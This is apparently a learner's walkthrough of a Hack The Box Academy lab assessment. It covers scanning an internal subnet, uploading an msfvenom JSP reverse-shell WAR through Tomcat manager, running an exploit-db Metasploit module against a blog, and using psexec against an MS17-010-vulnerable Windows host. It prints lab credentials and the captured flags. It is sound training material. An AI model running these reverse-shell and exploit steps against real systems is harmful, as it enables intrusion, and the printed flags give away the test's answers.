# The Live Engagement

Here we are. It’s the big day and time to start our engagement. We need to put our new skills with crafting and delivering payloads, acquiring and interacting with a shell on Windows and Linux, and how to take over a Web application to the test. Complete the objectives below to finish the engagement.

***

### Scenario:

CAT5's team has secured a foothold into Inlanefrieght's network for us. Our responsibility is to examine the results from the recon that was run, validate any info we deem necessary, research what can be seen, and choose which exploit, payloads, and shells will be used to control the targets. Once on the VPN or from your `Pwnbox`, we will need to `RDP` into the foothold host and perform any required actions from there. Below you will find any credentials, IP addresses, and other info that may be required.

***

### Objectives:

* Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Windows host or server`.
* Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Linux host or server`.
* Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Web application`.
* Demonstrate your ability to identify the `shell environment` you have access to as a user on the victim host.

Complete the objectives by answering the challenge questions `below`.

***

### Credentials and Other Needed Info:

Foothold:

* IP: 10.129.204.126
* Credentials: `htb-student` / HTB\_@cademy\_stdnt! Can be used by RDP.

***

### Connectivity To The Foothold

`Connection Instructions`:\
Accessing the Skills Assessment lab environment will require the use of [XfreeRDP](https://manpages.ubuntu.com/manpages/trusty/man1/xfreerdp.1.html) to provide GUI access to the virtual machine. We will be connecting to the Academy lab like normal utilizing your own VM with a HTB Academy `VPN key` or the `Pwnbox` built into the module section. You can start the `FreeRDP` client on the Pwnbox by typing the following into your shell once the target spawns:

Code: bash

```bash
xfreerdp /v:<target IP> /u:htb-student /p:HTB_@cademy_stdnt!
```

You can find the `target IP`, `Username`, and `Password` needed below:

* Click below in the Questions section to spawn the target host and obtain an IP address.
  * `IP` ==
  * `Username` == htb-student
  * `Password` == HTB\_@cademy\_stdnt!

Once you initiate the connection, you will be required to enter the provided credentials again in the window you see below:

**XFreeRDP Login**

![image](https://academy.hackthebox.com/storage/modules/115/xfree-login.png)

Enter your credentials again and click `OK` and you will be connected to the provided Parrot Linux desktop instance.

**Target Hosts**

![image](https://academy.hackthebox.com/storage/modules/115/challenge-map.png)

Hosts 1-3 will be your targets for this skills challenge. Each host has a unique vector to attack and may even have more than one route built-in. The challenge questions below can be answered by exploiting these three hosts. Gain access and enumerate these targets. You will need to utilize the Foothold PC provided. The IP will appear when you spawn the targets. Attempting to interact with the targets from anywhere other than the foothold will not work. Keep in mind that the Foothold host has access to the Internal inlanefreight network (`172.16.1.0/23` network) so you may want to pay careful attention to the IP address you pick when starting your listeners.

***

### Hints

Attempt to complete the challenges on your own. If you get stuck then view the helpful hints below and next to each challenge question:

`Host-1 hint`:

<details>

<summary>Click to show hint</summary>

This host has two upload vulnerabilities. If you look at status.inlanefreight.local or browse to the IP on port 8080, you will see the vector. When messing with one of them, the creds " tomcat | Tomcatadm " may come in handy.

</details>

`Host-2 hint`:

<details>

<summary>Click to show hint</summary>

Have you taken the time to validate the scan results? Did you browse to the webpage being hosted? blog.inlanefreight.local looks like a nice space for team members to chat. If you need the credentials for the blog, " admin:admin123!@# " have been given out to all members to edit their posts. At least, that's what our recon showed.

</details>

`Host-3 hint`:

<details>

<summary>Click to show hint</summary>

This host is vulnerable to a very common exploit released in 2017. It has been known to make many a sysadmin feel Blue.

</details>

Note: Please allow 1-2 minutes for the hosts in the assessment environment to spawn, then connect to the foothold machine using xfreerdp and begin. This would be a good time to review any notes and prepare for the challenge.

## Walkthrough

Since this is an _**enterprise network**_, _**not a single host**_ we have to _**scan**_ for the machines on the _**subnet**_:

```bash
nmap -T4 -sn 172.16.1.0/23
Nmap scan report for status.inlanefreight.local (172.16.1.11)
Nmap scan report for blog.inlanefreight.local (172.16.1.12)
Nmap scan report for 172.16.1.13
```

Let’s add the subdomains to our DNS resolution system:

```bash
echo '172.16.1.11 status.inlanefreight.local' >> /etc/hosts
echo '172.16.1.12 blog.inlanefreight.local' >> /etc/hosts
```

### What is the hostname of Host-1? (Format: all lower case)

```bash
┌─[htb-student@skills-foothold]─[~]
└──╼ $nmap -sV -sC 172.16.1.11
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-17 11:54 EST
Nmap scan report for status.inlanefreight.local (172.16.1.11)
Host is up (0.052s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Inlanefreight Server Status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
515/tcp  open  printer       Microsoft lpd
1801/tcp open  msmq?
2103/tcp open  msrpc         Microsoft Windows RPC
2105/tcp open  msrpc         Microsoft Windows RPC
2107/tcp open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-02-17T16:55:26+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SHELLS-WINSVR
|   NetBIOS_Domain_Name: SHELLS-WINSVR
|   NetBIOS_Computer_Name: SHELLS-WINSVR
|   DNS_Domain_Name: shells-winsvr
|   DNS_Computer_Name: shells-winsvr
|   Product_Version: 10.0.17763
|_  System_Time: 2024-02-17T16:55:21+00:00
| ssl-cert: Subject: commonName=shells-winsvr
| Not valid before: 2024-02-16T16:48:11
|_Not valid after:  2024-08-17T16:48:11
8080/tcp open  http          Apache Tomcat 10.0.11
|_http-title: Apache Tomcat/10.0.11
|_http-favicon: Apache Tomcat
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h36m00s, deviation: 3h34m39s, median: 0s
| smb2-time: 
|   date: 2024-02-17T16:55:21
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: shells-winsvr
|   NetBIOS computer name: SHELLS-WINSVR\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-02-17T08:55:21-08:00
|_nbstat: NetBIOS name: SHELLS-WINSVR, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:5d:7c (VMware)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

shells-winsvr

### Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)

```bash
#fist go to the target webpage since its port 8080
172.16.1.11:8080
#go to the manager app page
#creds tomcat:Tomcatadm
#now we generate java reverse shell with msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=8989 -f war > reverse.war
#upload it, then go to the page
#172.16.1.11:8080/reverse
C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0>cd C:\Shares
C:\Shares>dir
 Volume in drive C has no label.
 Volume Serial Number is 2683-3D37
 Directory of C:\Shares
09/22/2021  12:22 PM    <DIR>          .
09/22/2021  12:22 PM    <DIR>          ..
09/22/2021  12:24 PM    <DIR>          dev-share
               0 File(s)              0 bytes
               3 Dir(s)  26,683,228,160 bytes free
```

dev-share

### What distribution of Linux is running on Host-2? (Format: distro name, all lower case)

```bash
nmap -sC -sV blog.inlanefreight.local
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-17 12:24 EST
Nmap scan report for blog.inlanefreight.local (172.16.1.12)
Host is up (0.11s latency).
Other addresses for blog.inlanefreight.local (not scanned): 172.16.1.12
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f6:21:98:29:95:4c:a4:c2:21:7e:0e:a4:70:10:8e:25 (RSA)
|   256 6c:c2:2c:1d:16:c2:97:04:d5:57:0b:1e:b7:56:82:af (ECDSA)
|_  256 2f:8a:a4:79:21:1a:11:df:ec:28:68:c2:ff:99:2b:9a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Inlanefreight Gabber
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 00:50:56:B9:5C:7A (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

ubuntu

### What language is the shell written in that gets uploaded when using the 50064.rb exploit?

```bash
#based on the blog
https://www.exploit-db.com/exploits/50064
```

PHP

### Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt

I have downloaded the exploit and saved it into the metasploit exploits folder as _**light\_facebook.**_ Then i have used the command _**updatedb**_ and i was able to use the exploit from metasploit.

```bash
mkdir .msf4/modules/exploits/php/webapps
searchsploit -p 50064
searchsploit -m 50064 /usr/share/exploitdb/exploits/php/webapps/50064.rb
updatedb
msfconsole
set rhosts blog.inlanefreight.local
set user admin
set password admin123!@#
run
sessions -i 1
cat /customscripts/flag.txt
B1nD_Shells_r_cool
```

### What is the hostname of Host-3?

```bash
┌─[htb-student@skills-foothold]─[~]
└──╼ $nmap -sC -sV 172.16.1.13
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-17 12:59 EST
Nmap scan report for 172.16.1.13
Host is up (0.074s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: 172.16.1.13 - /
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h40m00s, deviation: 4h37m07s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:e6:b4 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-02-17T09:59:31-08:00
| smb2-time: 
|   date: 2024-02-17T17:59:31
|_  start_date: 2024-02-17T16:48:03
```

shells-winblue

### Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt

```bash
#based on the hints provided, we check eternalblue/psexec using nmap script
┌─[htb-student@skills-foothold]─[~]
└──╼ $nmap -sV --script=smb-vuln-ms17-010 172.16.1.13 -p139,445
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-17 13:05 EST
Nmap scan report for 172.16.1.13
Host is up (0.0049s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```

To exploit it

```bash
#Metasploit (i already tried eternal blue on this machine and it did not work)
msfconsole -q
search psexec
use 0
set rhosts $ip
set lhost $ip
run
shell
type C:\Users\Administrator\Desktop\Skills-flag.txt 
One-H0st-Down!
```
